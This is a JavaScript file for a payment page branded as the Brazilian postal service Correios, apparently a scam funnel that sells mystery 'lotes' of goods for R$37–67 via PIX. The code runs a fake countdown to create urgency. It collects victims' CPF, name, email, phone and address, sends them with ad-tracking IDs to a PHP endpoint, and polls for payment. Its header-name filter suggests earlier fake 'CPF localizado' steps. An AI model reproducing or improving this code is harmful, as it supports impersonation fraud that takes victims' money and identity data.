/**
 * ========================================
 * CORREIOS - PROGRAMA DE LOTES
 * JavaScript para seleÃ§Ã£o de lotes e pagamento PIX
 * VersÃ£o: 2.0.0
 * 
 * Changelog v2.0.0:
 * - Redesign completo da pÃ¡gina
 * - Timer de oferta exclusiva na tela inicial
 * - VerificaÃ§Ã£o de transaÃ§Ã£o existente na inicializaÃ§Ã£o
 * - ProteÃ§Ã£o robusta contra geraÃ§Ã£o infinita de PIX
 * ========================================
 */

(function() {
    'use strict';

    // ========================================
    // CONFIGURAÃ‡Ã•ES
    // ========================================
    const CONFIG = {
        // ConfiguraÃ§Ã£o dos lotes
        LOTES: {
            1: {
                name: 'Lote Eletrônicos #ECT-9700',
                amount: 3700, // R$ 37,00
                offer_hash: 'e8h0crt1kj',
                product_hash: 'kuzuqfz4cs'
            },
            2: {
                name: 'Lote Premium #ECT-13400',
                amount: 4700, // R$ 47,00
                offer_hash: 'mtdzwuc8df',
                product_hash: 'yi4apmlafh'
            },
            3: {
                name: 'Lote Escritório #ECT-19600',
                amount: 6700, // R$ 67,00
                offer_hash: 'hfha0hihr2',
                product_hash: 'ac4coxmbhl'
            }
        },
        
        // API Endpoints
        API_PIX_ENDPOINT: 'api/lote-pix.php',
        API_STATUS_ENDPOINT: 'api/status.php',
        
        // ConfiguraÃ§Ãµes de tempo
        CHECK_STATUS_INTERVAL: 5000, // 5 segundos
        EXPIRATION_MINUTES: 15,
        TRANSACTION_EXPIRY_MS: 15 * 60 * 1000, // 15 minutos
        OFFER_TIMER_MINUTES: 10, // Timer de oferta exclusiva
        
        // URL de redirecionamento apÃ³s pagamento (pÃ¡gina de sucesso final)
        REDIRECT_URL_SUCESSO: '/consulta/confirmacao.php',
        
        // Storage keys
        TRANSACTION_STORAGE_KEY_PREFIX: 'correios_lote_transaction_', // Sufixo serÃ¡ o lote_id
        SRC_STORAGE_KEY: 'correios_src',
        SESSION_STORAGE_KEY: 'correios_session',
        OFFER_TIMER_STORAGE_KEY: 'correios_lote_offer_timer',
        FUNNEL_STAGE_KEY: 'correios_funnel_stage'
    };

    // ========================================
    // HEADER COM NOME DO USUÃRIO
    // ========================================
    
    function decodificarNome(nome) {
        if (!nome) return nome;
        try {
            let decoded = nome;
            while (decoded.includes('%')) {
                const newDecoded = decodeURIComponent(decoded);
                if (newDecoded === decoded) break;
                decoded = newDecoded;
            }
            return decoded;
        } catch (e) {
            return nome;
        }
    }

    function validarNomeHeader(nome) {
        if (!nome) return false;
        const nomeUpper = nome.toUpperCase().trim();
        const nomesInvalidos = ['CPF LOCALIZADO', 'CPF ENCONTRADO', 'TITULAR', 'USUARIO', 'USUÃRIO', 'CLIENTE', 'PREZADO', 'DESTINATÃRIO', 'DESTINATARIO', '---'];
        return !nomesInvalidos.some(invalido => nomeUpper.includes(invalido));
    }

    function exibirNomeHeader() {
        const nome = localStorage.getItem('correios_nome');
        const nomeDecodificado = decodificarNome(nome);
        
        if (!validarNomeHeader(nomeDecodificado)) return;
        
        const headerNav = document.getElementById('headerNav');
        const userNameEl = document.querySelector('.btn-entrar .user-name');
        
        if (!headerNav || !userNameEl) return;
        
        const partes = nomeDecodificado.trim().split(/\s+/).map(p =>
            p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
        );
        
        const nomeExibido = partes.length >= 2 ? `${partes[0]} ${partes[1]}` : partes[0];
        
        userNameEl.textContent = nomeExibido;
        headerNav.classList.add('has-user-name');
    }

    // ========================================
    // ESTADO
    // ========================================
    let state = {
        selectedLote: null,
        selectedAmount: 0,
        selectedName: '',
        transactionHash: null,
        pixCode: null,
        checkStatusInterval: null,
        timerInterval: null,
        offerTimerInterval: null,
        expirationTime: null,
        offerEndTime: null,
        isGenerating: false
    };

    // ========================================
    // ELEMENTOS DOM
    // ========================================
    const elements = {
        // Screens
        screen1: document.getElementById('screen1'),
        screen2: document.getElementById('screen2'),
        checkoutStep1: document.getElementById('checkoutStep1'),
        checkoutStep2: document.getElementById('checkoutStep2'),
        indicadorEtapa1: document.getElementById('indicadorEtapa1'),
        indicadorEtapa2: document.getElementById('indicadorEtapa2'),
        
        // Screen 1 - Timer de oferta
        timerOferta: document.getElementById('timerOferta'),
        timerOfertaBar: document.getElementById('timerOfertaBar'),
        
        // Screen 2 - Pagamento
        pagamentoLoading: document.getElementById('pagamentoLoading'),
        pagamentoErro: document.getElementById('pagamentoErro'),
        pagamentoConteudo: document.getElementById('pagamentoConteudo'),
        erroMensagem: document.getElementById('erroMensagem'),
        loteTitulo: document.getElementById('loteTitulo'),
        valorPagar: document.getElementById('valorPagar'),
        qrcodeImg: document.getElementById('qrcodeImg'),
        pixCode: document.getElementById('pixCode'),
        btnCopiar: document.getElementById('btnCopiar'),
        timerExpiracao: document.getElementById('timerExpiracao'),
        timerProgressBar: document.getElementById('timerProgressBar'),
        statusAguardando: document.getElementById('statusAguardando'),
        statusPago: document.getElementById('statusPago')
    };

    // ========================================
    // FUNÃ‡Ã•ES UTILITÃRIAS
    // ========================================
    
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    function getSrc() {
        return localStorage.getItem(CONFIG.SRC_STORAGE_KEY) || getQueryParam('src') || '';
    }

    function getSessionData() {
        try {
            const data = localStorage.getItem(CONFIG.SESSION_STORAGE_KEY);
            if (!data) return null;
            return JSON.parse(data);
        } catch (e) {
            return null;
        }
    }

    async function ensureLeadDataBeforePix() {
        if (!window.LeadDataGate || typeof window.LeadDataGate.ensureData !== 'function') {
            showStep2();
            return;
        }

        await window.LeadDataGate.ensureData({
            requireContact: 'if-missing',
            requireAddress: true,
            requireIdentityForTracking: true,
            context: 'lote',
            displayMode: 'inline',
            inlineContainer: '#checkoutStep1',
            onInlineOpen: () => showStep1(),
            onInlineComplete: () => showStep2()
        });

        showStep2();
    }

    function updateStepIndicator(step) {
        if (elements.indicadorEtapa1) {
            elements.indicadorEtapa1.classList.toggle('active', step === 1);
            elements.indicadorEtapa1.classList.toggle('done', step > 1);
        }
        if (elements.indicadorEtapa2) {
            elements.indicadorEtapa2.classList.toggle('active', step === 2);
            elements.indicadorEtapa2.classList.remove('done');
        }
    }

    function showStep1() {
        if (elements.checkoutStep1) {
            elements.checkoutStep1.style.display = 'block';
        }
        if (elements.checkoutStep2) {
            elements.checkoutStep2.style.display = 'none';
        }
        updateStepIndicator(1);
    }

    function showStep2() {
        if (elements.checkoutStep1) {
            elements.checkoutStep1.style.display = 'none';
        }
        if (elements.checkoutStep2) {
            elements.checkoutStep2.style.display = 'block';
        }
        updateStepIndicator(2);
    }

    function generateSessionHash(identifier) {
        const data = identifier + '_lote_' + new Date().toDateString();
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    function formatarMoeda(centavos) {
        return 'R$ ' + (centavos / 100).toFixed(2).replace('.', ',');
    }

    // ========================================
    // TIMER DE OFERTA EXCLUSIVA
    // ========================================
    
    function iniciarTimerOferta(forceReset = false) {
        // Tenta recuperar timer salvo do localStorage
        if (!forceReset && !state.offerEndTime) {
            const savedTimer = localStorage.getItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
            if (savedTimer) {
                const savedEndTime = parseInt(savedTimer, 10);
                if (savedEndTime > Date.now()) {
                    state.offerEndTime = savedEndTime;
                    console.log('â±ï¸ Timer de oferta recuperado do localStorage');
                }
            }
        }
        
        // Verifica se jÃ¡ tem um timer vÃ¡lido
        if (!forceReset && state.offerEndTime && state.offerEndTime > Date.now()) {
            // Timer ainda vÃ¡lido - apenas reinicia o interval
            if (!state.offerTimerInterval) {
                atualizarTimerOferta();
                state.offerTimerInterval = setInterval(atualizarTimerOferta, 1000);
            }
            return;
        }
        
        // Inicia novo timer apenas se nÃ£o existir ou forceReset
        const totalSeconds = CONFIG.OFFER_TIMER_MINUTES * 60;
        state.offerEndTime = Date.now() + (totalSeconds * 1000);
        
        // Salva no localStorage para persistir entre recarregamentos
        localStorage.setItem(CONFIG.OFFER_TIMER_STORAGE_KEY, state.offerEndTime.toString());
        console.log('â±ï¸ Novo timer de oferta iniciado e salvo');
        
        atualizarTimerOferta();
        state.offerTimerInterval = setInterval(atualizarTimerOferta, 1000);
    }
    
    function atualizarTimerOferta() {
        const agora = Date.now();
        const restante = state.offerEndTime - agora;
        
        if (restante <= 0) {
            if (state.offerTimerInterval) {
                clearInterval(state.offerTimerInterval);
            }
            // Limpa timer do localStorage
            localStorage.removeItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
            
            // Timer expirado - redireciona para pÃ¡gina inicial
            if (elements.timerOferta) {
                elements.timerOferta.textContent = '00:00';
            }
            if (elements.timerOfertaBar) {
                elements.timerOfertaBar.style.width = '0%';
            }
            // Redireciona apÃ³s 2 segundos
            setTimeout(() => {
                window.location.href = 'confirmacao.php';
            }, 2000);
            return;
        }
        
        const minutos = Math.floor(restante / 60000);
        const segundos = Math.floor((restante % 60000) / 1000);
        
        if (elements.timerOferta) {
            elements.timerOferta.textContent = 
                `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
        }
        
        if (elements.timerOfertaBar) {
            const totalMs = CONFIG.OFFER_TIMER_MINUTES * 60 * 1000;
            const porcentagem = (restante / totalMs) * 100;
            elements.timerOfertaBar.style.width = `${porcentagem}%`;
        }
    }

    // ========================================
    // SELEÃ‡ÃƒO DE LOTE
    // ========================================

    window.selecionarLote = async function(loteId, amount, name) {
        // Para timer de oferta (mas nÃ£o reseta o tempo)
        if (state.offerTimerInterval) {
            clearInterval(state.offerTimerInterval);
            state.offerTimerInterval = null;
        }
        
        // Atualiza estado com lote selecionado
        state.selectedLote = loteId;
        state.selectedAmount = amount;
        state.selectedName = name;
        
        console.log(`ðŸŽ¯ Selecionando Lote ${loteId}: ${name}`);

        // Verifica se jÃ¡ existe transaÃ§Ã£o PARA ESTE LOTE ESPECÃFICO
        const transacaoExistente = recuperarTransacao(loteId);
        
        if (transacaoExistente) {
            console.log(`âœ… TransaÃ§Ã£o existente encontrada para Lote ${loteId}, verificando status...`);
            
            // Verifica se jÃ¡ foi paga
            try {
                const statusResponse = await fetch(`${CONFIG.API_STATUS_ENDPOINT}?hash=${transacaoExistente.hash}&step=lote`);
                const statusResult = await statusResponse.json();
                
                if (statusResult.success && statusResult.data) {
                    const status = statusResult.data.status?.toLowerCase();
                    
                    if (status === 'paid' || status === 'approved' || status === 'completed') {
                        console.log('ðŸ’° PIX LOTE JÃ FOI PAGO! Redirecionando...');
                        limparTodasTransacoes();
                        localStorage.removeItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
                        window.location.href = CONFIG.REDIRECT_URL_SUCESSO;
                        return;
                    }
                }
            } catch (e) {
                console.log('âš ï¸ Erro ao verificar status:', e.message);
            }
            
            // PIX ainda pendente - mostra tela de pagamento com PIX existente
            console.log(`â³ PIX do Lote ${loteId} ainda pendente, exibindo transaÃ§Ã£o existente...`);
            
            state.transactionHash = transacaoExistente.hash;
            state.pixCode = transacaoExistente.pix_code;
            state.expirationTime = transacaoExistente.created_at + CONFIG.TRANSACTION_EXPIRY_MS;
            
            // Mostra tela de pagamento
            elements.screen1.style.display = 'none';
            elements.screen2.style.display = 'block';
            elements.screen2.scrollIntoView({ behavior: 'smooth' });
            showStep2();
            
            // Atualiza tÃ­tulo e valor
            if (elements.loteTitulo) {
                elements.loteTitulo.textContent = name;
            }
            if (elements.valorPagar) {
                elements.valorPagar.textContent = formatarMoeda(amount);
            }
            
            // Exibe dados do PIX existente
            exibirDadosPix({
                pix_code: transacaoExistente.pix_code,
                pix_qrcode: transacaoExistente.pix_qrcode,
                amount_formatted: transacaoExistente.amount_formatted || formatarMoeda(amount)
            });
            
            mostrarConteudo();
            iniciarVerificacaoStatus();
            iniciarTimer();
            return;
        }
        
        // NÃ£o tem transaÃ§Ã£o existente para este lote - gera novo PIX
        console.log(`ðŸ†• Nenhuma transaÃ§Ã£o para Lote ${loteId}, gerando novo PIX...`);
        
        // Mostra tela de pagamento
        elements.screen1.style.display = 'none';
        elements.screen2.style.display = 'block';
        elements.screen2.scrollIntoView({ behavior: 'smooth' });
        showStep2();
        
        // Atualiza tÃ­tulo e valor
        if (elements.loteTitulo) {
            elements.loteTitulo.textContent = name;
        }
        if (elements.valorPagar) {
            elements.valorPagar.textContent = formatarMoeda(amount);
        }
        
        // Gera PIX
        gerarPixLote();
    };

    window.voltarLotes = function() {
        // Para verificaÃ§Ãµes de status do PIX (mas mantÃ©m a transaÃ§Ã£o salva)
        pararVerificacoes();
        
        // Volta para lista de lotes
        elements.screen2.style.display = 'none';
        elements.screen1.style.display = 'block';
        elements.screen1.scrollIntoView({ behavior: 'smooth' });
        
        // NÃƒO limpa o estado - mantÃ©m a transaÃ§Ã£o para reutilizaÃ§Ã£o
        // O estado serÃ¡ atualizado quando selecionar outro lote
        
        // Continua o timer de oferta de onde parou (sem reiniciar)
        iniciarTimerOferta(false); // false = nÃ£o forÃ§a reset
    };

    // ========================================
    // GERENCIAMENTO DE TRANSAÃ‡ÃƒO (POR LOTE)
    // ========================================

    function getTransactionKey(loteId) {
        return CONFIG.TRANSACTION_STORAGE_KEY_PREFIX + (loteId || state.selectedLote || 'unknown');
    }

    function salvarTransacao(data) {
        const loteId = state.selectedLote;
        if (!loteId) {
            console.error('âŒ NÃ£o Ã© possÃ­vel salvar transaÃ§Ã£o sem lote selecionado');
            return null;
        }
        
        const transacao = {
            hash: data.transaction_hash,
            pix_code: data.pix_code,
            pix_qrcode: data.pix_qrcode,
            amount: data.amount,
            amount_formatted: data.amount_formatted,
            lote_id: loteId,
            lote_name: state.selectedName,
            expires_at: data.expires_at,
            created_at: Date.now(),
            session_hash: generateSessionHash(getSrc() || 'anonymous')
        };
        
        const key = getTransactionKey(loteId);
        localStorage.setItem(key, JSON.stringify(transacao));
        console.log(`âœ… TransaÃ§Ã£o salva para Lote ${loteId}: ${key}`);
        return transacao;
    }

    function recuperarTransacao(loteId = null) {
        const targetLote = loteId || state.selectedLote;
        if (!targetLote) return null;
        
        try {
            const key = getTransactionKey(targetLote);
            const data = localStorage.getItem(key);
            if (!data) return null;
            
            const transacao = JSON.parse(data);
            
            // Verifica se expirou
            const agora = Date.now();
            const criado = transacao.created_at || 0;
            
            if (agora - criado > CONFIG.TRANSACTION_EXPIRY_MS) {
                limparTransacao(targetLote);
                console.log(`â° TransaÃ§Ã£o do Lote ${targetLote} expirada, removendo...`);
                return null;
            }
            
            transacao.tempo_restante_ms = CONFIG.TRANSACTION_EXPIRY_MS - (agora - criado);
            console.log(`ðŸ“¦ TransaÃ§Ã£o recuperada para Lote ${targetLote}`);
            return transacao;
        } catch (e) {
            limparTransacao(targetLote);
            return null;
        }
    }

    function limparTransacao(loteId = null) {
        const targetLote = loteId || state.selectedLote;
        if (targetLote) {
            const key = getTransactionKey(targetLote);
            localStorage.removeItem(key);
        }
    }
    
    function limparTodasTransacoes() {
        // Limpa transaÃ§Ãµes de todos os lotes
        Object.keys(CONFIG.LOTES).forEach(loteId => {
            const key = getTransactionKey(loteId);
            localStorage.removeItem(key);
        });
        console.log('ðŸ—‘ï¸ Todas as transaÃ§Ãµes de lotes removidas');
    }
    
    // Verifica se existe alguma transaÃ§Ã£o vÃ¡lida de qualquer lote
    function verificarTransacaoExistente() {
        for (const loteId of Object.keys(CONFIG.LOTES)) {
            const transacao = recuperarTransacao(parseInt(loteId));
            if (transacao) {
                return { loteId: parseInt(loteId), transacao };
            }
        }
        return null;
    }

    // ========================================
    // UI DO PAGAMENTO
    // ========================================

    function mostrarLoading() {
        showStep2();
        elements.pagamentoLoading.style.display = 'block';
        elements.pagamentoErro.style.display = 'none';
        elements.pagamentoConteudo.style.display = 'none';
    }

    function mostrarErro(mensagem) {
        showStep2();
        elements.pagamentoLoading.style.display = 'none';
        elements.pagamentoErro.style.display = 'block';
        elements.pagamentoConteudo.style.display = 'none';
        elements.erroMensagem.textContent = mensagem;
        pararVerificacoes();
    }

    function mostrarConteudo() {
        showStep2();
        elements.pagamentoLoading.style.display = 'none';
        elements.pagamentoErro.style.display = 'none';
        elements.pagamentoConteudo.style.display = 'block';
    }

    function pararVerificacoes() {
        if (state.checkStatusInterval) {
            clearInterval(state.checkStatusInterval);
            state.checkStatusInterval = null;
        }
        if (state.timerInterval) {
            clearInterval(state.timerInterval);
            state.timerInterval = null;
        }
    }

    // ========================================
    // GERAR PIX
    // ========================================
    
    window.gerarPixLote = async function() {
        if (state.isGenerating) {
            console.log('RequisiÃ§Ã£o jÃ¡ em andamento...');
            return;
        }

        if (!state.selectedLote) {
            mostrarErro('Nenhum lote selecionado.');
            return;
        }

        // Verifica transaÃ§Ã£o existente
        const transacaoExistente = recuperarTransacao();
        
        if (transacaoExistente) {
            console.log('âœ… TransaÃ§Ã£o LOTE existente encontrada, verificando status...');
            
            state.transactionHash = transacaoExistente.hash;
            state.pixCode = transacaoExistente.pix_code;
            state.expirationTime = transacaoExistente.created_at + CONFIG.TRANSACTION_EXPIRY_MS;
            
            // Verifica se jÃ¡ foi pago
            try {
                const statusResponse = await fetch(`${CONFIG.API_STATUS_ENDPOINT}?hash=${transacaoExistente.hash}&step=lote`);
                const statusResult = await statusResponse.json();
                
                if (statusResult.success && statusResult.data) {
                    const status = statusResult.data.status?.toLowerCase();
                    
                    if (status === 'paid' || status === 'approved' || status === 'completed') {
                        console.log('ðŸ’° PIX LOTE JÃ FOI PAGO! Redirecionando...');
                        limparTodasTransacoes();
                        localStorage.removeItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
                        window.location.href = CONFIG.REDIRECT_URL_SUCESSO;
                        return;
                    }
                }
            } catch (e) {
                console.log('âš ï¸ Erro ao verificar status:', e.message);
            }
            
            // Exibe dados do PIX
            exibirDadosPix({
                pix_code: transacaoExistente.pix_code,
                pix_qrcode: transacaoExistente.pix_qrcode,
                amount_formatted: transacaoExistente.amount_formatted || formatarMoeda(state.selectedAmount)
            });
            
            mostrarConteudo();
            iniciarVerificacaoStatus();
            iniciarTimer();
            return;
        }

        // Gera nova transaÃ§Ã£o
        await ensureLeadDataBeforePix();
        state.isGenerating = true;
        mostrarLoading();

        try {
            const sessionData = getSessionData();
            const src = getSrc();
            const loteConfig = CONFIG.LOTES[state.selectedLote];
            
            // Coleta tracking
            const urlParams = new URLSearchParams(window.location.search);
            const tracking = {
                src: src,
                gclid: urlParams.get('gclid') || '',
                gbraid: urlParams.get('gbraid') || '',
                wbraid: urlParams.get('wbraid') || '',
                utm_source: urlParams.get('utm_source') || '',
                utm_medium: urlParams.get('utm_medium') || '',
                utm_campaign: urlParams.get('utm_campaign') || ''
            };

            console.log('ðŸ“Š Gerando PIX LOTE com tracking:', {
                lote: state.selectedLote,
                src: tracking.src,
                gclid: tracking.gclid ? 'SIM' : 'NÃƒO'
            });

            // Recupera dados do cliente salvos no front-end para consistÃªncia
            const email = localStorage.getItem('correios_email') || '';
            const telefone = localStorage.getItem('correios_telefone') || '';
            const cpf = localStorage.getItem('correios_cpf') || sessionData?.cpf || '';
            const nome = localStorage.getItem('correios_nome') || sessionData?.nome || '';
            
            const response = await fetch(CONFIG.API_PIX_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cpf: cpf,
                    nome: nome,
                    email: email,
                    telefone: telefone,
                    lote_id: state.selectedLote,
                    lote_name: state.selectedName,
                    amount: state.selectedAmount,
                    offer_hash: loteConfig?.offer_hash || '',
                    product_hash: loteConfig?.product_hash || '',
                    ...tracking
                })
            });

            const result = await response.json();

            if (!result.success) {
                throw new Error(result.error || 'Erro ao gerar PIX');
            }

            // Salva transaÃ§Ã£o
            salvarTransacao(result.data);

            // Atualiza estado
            state.transactionHash = result.data.transaction_hash;
            state.pixCode = result.data.pix_code;
            state.expirationTime = Date.now() + CONFIG.TRANSACTION_EXPIRY_MS;

            // Atualiza UI
            exibirDadosPix(result.data);
            mostrarConteudo();

            // Inicia verificaÃ§Ãµes
            iniciarVerificacaoStatus();
            iniciarTimer();

        } catch (error) {
            console.error('Erro ao gerar PIX LOTE:', error);
            mostrarErro(error.message || 'Erro ao gerar cÃ³digo PIX. Tente novamente.');
        } finally {
            state.isGenerating = false;
        }
    };

    function exibirDadosPix(data) {
        elements.valorPagar.textContent = data.amount_formatted || formatarMoeda(state.selectedAmount);

        const pixCode = data.pix_code || data.pix_qrcode || '';
        if (pixCode) {
            elements.qrcodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}`;
        }

        elements.pixCode.value = data.pix_code || '';
    }

    // ========================================
    // COPIAR CÃ“DIGO
    // ========================================
    
    window.copiarCodigo = async function() {
        const codigo = elements.pixCode.value;
        if (!codigo) return;

        try {
            await navigator.clipboard.writeText(codigo);
            
            const btnCopiar = elements.btnCopiar;
            const textoOriginal = btnCopiar.innerHTML;
            
            btnCopiar.innerHTML = '<i class="fas fa-check"></i><span>Copiado!</span>';
            btnCopiar.classList.add('copiado');
            
            elements.pixCode.select();
            
            if (navigator.vibrate) {
                navigator.vibrate(100);
            }
            
            setTimeout(() => {
                btnCopiar.innerHTML = textoOriginal;
                btnCopiar.classList.remove('copiado');
            }, 2000);
            
        } catch (err) {
            elements.pixCode.select();
            document.execCommand('copy');
            alert('CÃ³digo copiado!');
        }
    };

    // ========================================
    // VERIFICAÃ‡ÃƒO DE STATUS
    // ========================================
    
    function iniciarVerificacaoStatus() {
        if (state.checkStatusInterval) {
            clearInterval(state.checkStatusInterval);
        }

        verificarStatus();
        state.checkStatusInterval = setInterval(verificarStatus, CONFIG.CHECK_STATUS_INTERVAL);
    }

    async function verificarStatus() {
        if (!state.transactionHash) return;

        try {
            const response = await fetch(`${CONFIG.API_STATUS_ENDPOINT}?hash=${encodeURIComponent(state.transactionHash)}&step=lote`);
            const result = await response.json();

            if (result.success && result.data.is_paid) {
                pagamentoConfirmado();
            }
        } catch (error) {
            console.error('Erro ao verificar status:', error);
        }
    }

    function pagamentoConfirmado() {
        pararVerificacoes();
        
        // Limpa TODAS as transaÃ§Ãµes de lotes (pagamento concluÃ­do com sucesso)
        limparTodasTransacoes();
        
        // Limpa timer de oferta
        localStorage.removeItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
        
        // ========================================
        // SALVA ESTADO DO FUNIL - COMPLETO
        // Expira em 24 horas
        // ========================================
        const funnelData = {
            stage: 'completed',
            timestamp: Date.now()
        };
        localStorage.setItem(CONFIG.FUNNEL_STAGE_KEY, JSON.stringify(funnelData));
        console.log('âœ… Estado do funil salvo: completed (expira em 24h)');

        elements.statusAguardando.style.display = 'none';
        elements.statusPago.style.display = 'flex';

        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
        }

        setTimeout(() => {
            // Usa replace() para substituir histÃ³rico
            window.location.replace(CONFIG.REDIRECT_URL_SUCESSO);
        }, 3000);
    }

    // ========================================
    // TIMER DE EXPIRAÃ‡ÃƒO
    // ========================================
    
    function iniciarTimer() {
        if (state.timerInterval) {
            clearInterval(state.timerInterval);
        }

        atualizarTimer();
        state.timerInterval = setInterval(atualizarTimer, 1000);
    }

    function atualizarTimer() {
        const agora = Date.now();
        const restante = state.expirationTime - agora;
        const total = CONFIG.TRANSACTION_EXPIRY_MS;

        if (restante <= 0) {
            pararVerificacoes();
            // Limpa apenas a transaÃ§Ã£o do lote atual (permite tentar novamente)
            limparTransacao(state.selectedLote);
            elements.timerExpiracao.textContent = '00:00';
            if (elements.timerProgressBar) {
                elements.timerProgressBar.style.width = '0%';
            }
            mostrarErro('O cÃ³digo PIX expirou. Clique em "Tentar Novamente" para gerar um novo cÃ³digo.');
            return;
        }

        const minutos = Math.floor(restante / 60000);
        const segundos = Math.floor((restante % 60000) / 1000);

        elements.timerExpiracao.textContent = 
            `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
        
        if (elements.timerProgressBar) {
            const porcentagem = (restante / total) * 100;
            elements.timerProgressBar.style.width = `${porcentagem}%`;
        }
    }

    // ========================================
    // INICIALIZAÃ‡ÃƒO
    // ========================================
    
    async function init() {
        console.log('ðŸš€ LOTE inicializando...');
        
        // Exibe nome do usuÃ¡rio no header
        exibirNomeHeader();
        
        // Captura src da URL se existir
        const srcUrl = getQueryParam('src');
        if (srcUrl) {
            localStorage.setItem(CONFIG.SRC_STORAGE_KEY, srcUrl);
        }

        // ========================================
        // VERIFICAÃ‡ÃƒO DE TRANSAÃ‡ÃƒO EXISTENTE
        // Verifica se existe algum PIX pendente de qualquer lote
        // ========================================
        const resultado = verificarTransacaoExistente();
        
        if (resultado) {
            const { loteId, transacao } = resultado;
            console.log(`âœ… TransaÃ§Ã£o existente encontrada para Lote ${loteId}, verificando status...`);
            
            // Restaura estado do lote selecionado
            state.selectedLote = loteId;
            state.selectedName = transacao.lote_name || CONFIG.LOTES[loteId]?.name || '';
            state.selectedAmount = transacao.amount || CONFIG.LOTES[loteId]?.amount || 0;
            
            // Verifica se jÃ¡ foi paga
            try {
                const statusResponse = await fetch(`${CONFIG.API_STATUS_ENDPOINT}?hash=${transacao.hash}&step=lote`);
                const statusResult = await statusResponse.json();
                
                if (statusResult.success && statusResult.data) {
                    const status = statusResult.data.status?.toLowerCase();
                    
                    if (status === 'paid' || status === 'approved' || status === 'completed') {
                        console.log('ðŸ’° PIX LOTE JÃ FOI PAGO! Redirecionando...');
                        limparTodasTransacoes();
                        localStorage.removeItem(CONFIG.OFFER_TIMER_STORAGE_KEY);
                        window.location.href = CONFIG.REDIRECT_URL_SUCESSO;
                        return;
                    }
                }
            } catch (e) {
                console.log('âš ï¸ Erro ao verificar status:', e.message);
            }
            
            // PIX ainda pendente - vai direto para tela de pagamento
            console.log(`â³ PIX do Lote ${loteId} pendente, exibindo tela de pagamento...`);
            
            state.transactionHash = transacao.hash;
            state.pixCode = transacao.pix_code;
            state.expirationTime = transacao.created_at + CONFIG.TRANSACTION_EXPIRY_MS;
            
            // Atualiza tÃ­tulo e valor
            if (elements.loteTitulo) {
                elements.loteTitulo.textContent = state.selectedName;
            }
            if (elements.valorPagar) {
                elements.valorPagar.textContent = formatarMoeda(state.selectedAmount);
            }
            
            // Esconde seleÃ§Ã£o de lotes, mostra pagamento direto
            elements.screen1.style.display = 'none';
            elements.screen2.style.display = 'block';
            showStep2();
            
            // Exibe dados do PIX
            exibirDadosPix({
                pix_code: transacao.pix_code,
                pix_qrcode: transacao.pix_qrcode,
                amount_formatted: transacao.amount_formatted || formatarMoeda(state.selectedAmount)
            });
            
            mostrarConteudo();
            iniciarVerificacaoStatus();
            iniciarTimer();
            return;
        }

        // NÃ£o tem transaÃ§Ã£o existente - mostra seleÃ§Ã£o de lotes
        iniciarTimerOferta();
        console.log('âœ… LOTE inicializado - exibindo seleÃ§Ã£o de lotes');
    }

    // Cleanup
    window.addEventListener('beforeunload', function() {
        pararVerificacoes();
        if (state.offerTimerInterval) {
            clearInterval(state.offerTimerInterval);
        }
    });

    // Aguarda DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();